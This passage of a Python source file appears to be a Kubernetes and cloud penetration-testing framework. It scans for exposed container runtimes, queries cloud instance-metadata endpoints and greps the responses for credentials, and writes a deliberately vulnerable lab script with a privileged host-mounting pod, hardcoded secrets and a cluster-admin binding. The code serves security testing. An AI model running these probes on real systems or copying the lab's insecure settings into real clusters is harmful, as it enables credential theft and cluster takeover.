    def get_summary(self) -> Dict[str, Any]:
        """Récupération du résumé de performance"""
        return {
            "total_runtime": time.time() - self.start_time,
            "checkpoints": self.checkpoints,
            "memory_usage": self._get_memory_usage()
        }
    
    def _get_memory_usage(self) -> Dict[str, Any]:
        """Récupération de l'utilisation mémoire"""
        try:
            process = psutil.Process()
            memory_info = process.memory_info()
            return {
                "rss": memory_info.rss,
                "vms": memory_info.vms,
                "percent": process.memory_percent()
            }
        except:
            return {"error": "Could not retrieve memory info"}

def validate_network_target(target: str) -> bool:
    """Validation d'une cible réseau"""
    try:
        if '/' in target:
            # CIDR notation
            IPv4Network(target, strict=False)
            return True
        else:
            # Single IP
            IPv4Address(target)
            return True
    except:
        return False

def sanitize_filename(filename: str) -> str:
    """Nettoyage d'un nom de fichier"""
    import re
    # Remove or replace invalid characters
    filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
    # Remove control characters
    filename = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', filename)
    # Limit length
    if len(filename) > 255:
        filename = filename[:255]
    return filename

# ============================================================================
# ADDITIONAL MODULES FOR SPECIFIC SCENARIOS
# ============================================================================

class ContainerRuntimeScanner(BaseModule):
    """Scanner spécialisé pour les runtimes de conteneurs"""
    
    def __init__(self, config: FrameworkConfig):
        super().__init__(config)
        self.runtime_ports = {
            2375: "Docker API (insecure)",
            2376: "Docker API (TLS)",
            10250: "Kubelet",
            2379: "etcd",
            5000: "Docker Registry",
            8080: "Docker Registry (alt)"
        }
    
    async def execute(self, targets: List[str]) -> List[Finding]:
        """Scan spécialisé des runtimes de conteneurs"""
        self.logger.info("Starting container runtime scanning")
        
        tasks = []
        for target in targets:
            if self._is_target_allowed(target):
                tasks.append(self._scan_container_runtime(target))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        return self.findings
    
    async def _scan_container_runtime(self, target: str):
        """Scan d'un runtime de conteneur"""
        for port, service_name in self.runtime_ports.items():
            try:
                if await self._is_port_open(target, port):
                    await self._analyze_container_service(target, port, service_name)
            except Exception as e:
                self.logger.debug(f"Error scanning {target}:{port}: {e}")
    
    async def _is_port_open(self, host: str, port: int) -> bool:
        """Vérification d'ouverture de port"""
        try:
            future = asyncio.open_connection(host, port)
            reader, writer = await asyncio.wait_for(future, timeout=3)
            writer.close()
            try:
                await writer.wait_closed()
            except:
                pass
            return True
        except:
            return False
    
    async def _analyze_container_service(self, target: str, port: int, service_name: str):
        """Analyse d'un service de conteneur"""
        # Implementation for analyzing specific container services
        self.add_finding(
            target=f"{target}:{port}",
            service="container_runtime",
            phase="container_runtime_detection",
            vulnerability=f"Exposed {service_name}",
            severity=SeverityLevel.HIGH,
            description=f"{service_name} detected on {target}:{port}",
            evidence={"port": port, "service": service_name},
            remediation=f"Secure {service_name} with proper authentication and network controls"
        )

class CloudMetadataExplorer(BaseModule):
    """Explorateur de métadonnées cloud"""
    
    def __init__(self, config: FrameworkConfig):
        super().__init__(config)
        self.metadata_endpoints = {
            "aws": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/latest/dynamic/instance-identity/"
            ],
            "gcp": [
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/computeMetadata/v1/"
            ],
            "azure": [
                "http://169.254.169.254/metadata/instance",
                "http://169.254.169.254/metadata/identity"
            ],
            "eks": [
                "http://169.254.170.23/v1/credentials",
                "http://169.254.170.23/v1/association"
            ]
        }
    
    async def execute(self, targets: List[str]) -> List[Finding]:
        """Exploration des métadonnées cloud"""
        self.logger.info("Starting cloud metadata exploration")
        
        for cloud_provider, endpoints in self.metadata_endpoints.items():
            await self._explore_cloud_metadata(cloud_provider, endpoints)
        
        return self.findings
    
    async def _explore_cloud_metadata(self, provider: str, endpoints: List[str]):
        """Exploration des métadonnées d'un provider cloud"""
        async with aiohttp.ClientSession(timeout=self.session_timeout) as session:
            for endpoint in endpoints:
                try:
                    headers = self._get_cloud_headers(provider)
                    async with session.get(endpoint, headers=headers) as response:
                        if response.status == 200:
                            data = await response.text()
                            
                            self.add_finding(
                                target=endpoint,
                                service=f"{provider}_metadata",
                                phase="cloud_metadata_exploration",
                                vulnerability="Cloud metadata service accessible",
                                severity=SeverityLevel.INFO,
                                description=f"{provider.upper()} metadata service accessible",
                                evidence={
                                    "provider": provider,
                                    "endpoint": endpoint,
                                    "response_sample": data[:200] + "..." if len(data) > 200 else data
                                },
                                remediation="Review cloud metadata service access and implement restrictions if needed"
                            )
                            
                            # Parse specific metadata for credentials
                            await self._parse_metadata_for_credentials(provider, endpoint, data)
                            
                except Exception as e:
                    self.logger.debug(f"Cloud metadata exploration failed for {endpoint}: {e}")
    
    def _get_cloud_headers(self, provider: str) -> Dict[str, str]:
        """Récupération des headers spécifiques au cloud provider"""
        headers = {}
        if provider == "gcp":
            headers["Metadata-Flavor"] = "Google"
        elif provider == "azure":
            headers["Metadata"] = "true"
        return headers
    
    async def _parse_metadata_for_credentials(self, provider: str, endpoint: str, data: str):
        """Parse des métadonnées pour détecter des credentials"""
        # Look for credential patterns in metadata
        credential_patterns = [
            r'(?i)(access[_-]?key|secret[_-]?key|token)',
            r'(?i)(password|credential)',
            r'eyJ[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+\.[a-zA-Z0-9\-_]+',  # JWT
        ]
        
        for pattern in credential_patterns:
            matches = re.findall(pattern, data, re.IGNORECASE)
            if matches:
                self.add_finding(
                    target=endpoint,
                    service=f"{provider}_credentials",
                    phase="cloud_metadata_exploration",
                    vulnerability="Potential credentials in cloud metadata",
                    severity=SeverityLevel.MEDIUM,
                    description=f"Potential credentials found in {provider.upper()} metadata",
                    evidence={
                        "provider": provider,
                        "endpoint": endpoint,
                        "matches": matches[:5]  # First 5 matches only
                    },
                    remediation="Review metadata exposure and implement proper credential management"
                )

# ============================================================================
# MAIN EXECUTION
# ============================================================================

if __name__ == "__main__":
    # Check Python version
    if sys.version_info < (3, 7):
        print("Error: Python 3.7+ required")
        sys.exit(1)
    
    # Check if running with proper permissions
    if os.geteuid() == 0:
        print("Warning: Running as root. Consider using a non-privileged user.")
    
    try:
        # Run the async main function
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(1)

# ============================================================================
# ADDITIONAL UTILITIES AND HELPERS
# ============================================================================

class FrameworkUpdater:
    """Gestionnaire de mise à jour du framework"""
    
    def __init__(self):
        self.current_version = "1.0"
        self.github_repo = "wKayaa/k8s-pentest-framework"
    
    async def check_for_updates(self):
        """Vérification des mises à jour"""
        try:
            async with aiohttp.ClientSession() as session:
                url = f"https://api.github.com/repos/{self.github_repo}/releases/latest"
                async with session.get(url) as response:
                    if response.status == 200:
                        data = await response.json()
                        latest_version = data.get('tag_name', '').lstrip('v')
                        
                        if latest_version != self.current_version:
                            print(f"[!] Update available: v{latest_version} (current: v{self.current_version})")
                            print(f"    Download: {data.get('html_url', '')}")
                        else:
                            print(f"[*] Framework is up to date (v{self.current_version})")
        except Exception as e:
            print(f"[!] Could not check for updates: {e}")

def create_lab_environment():
    """Création d'un environnement de lab pour les tests"""
    lab_script = """#!/bin/bash
# Kubernetes Lab Environment Setup Script
# This creates a minimal vulnerable K8s environment for testing

echo "Setting up Kubernetes lab environment..."

# Create vulnerable pod with privileged access
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: vulnerable-pod
  namespace: default
spec:
  containers:
  - name: vuln-container
    image: busybox
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
    env:
    - name: SECRET_KEY
      value: "super-secret-key-123"
    - name: DATABASE_PASSWORD
      value: "admin123"
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
EOF

# Create secret with sensitive data
kubectl create secret generic test-secret \\
  --from-literal=username=admin \\
  --from-literal=password=secret123 \\
  --from-literal=api-key=abcd1234efgh5678

# Create service account with cluster-admin (BAD PRACTICE)
kubectl create clusterrolebinding vuln-binding \\
  --clusterrole=cluster-admin \\
  --serviceaccount=default:default

echo "Lab environment created!"
echo "WARNING: This environment is intentionally vulnerable!"
echo "Only use in isolated lab environments!"
"""
    
    with open("setup_lab.sh", "w") as f:
        f.write(lab_script)
    
    os.chmod("setup_lab.sh", 0o755)
    print("Lab setup script created: setup_lab.sh")

def cleanup_lab_environment():
    """Nettoyage de l'environnement de lab"""
    cleanup_script = """#!/bin/bash
# Cleanup script for Kubernetes lab environment

echo "Cleaning up lab environment..."

kubectl delete pod vulnerable-pod --ignore-not-found=true
kubectl delete secret test-secret --ignore-not-found=true
kubectl delete clusterrolebinding vuln-binding --ignore-not-found=true

echo "Lab environment cleaned up!"
"""
    
    with open("cleanup_lab.sh", "w") as f:
        f.write(cleanup_script)
    
    os.chmod("cleanup_lab.sh", 0o755)
    print("Lab cleanup script created: cleanup_lab.sh")
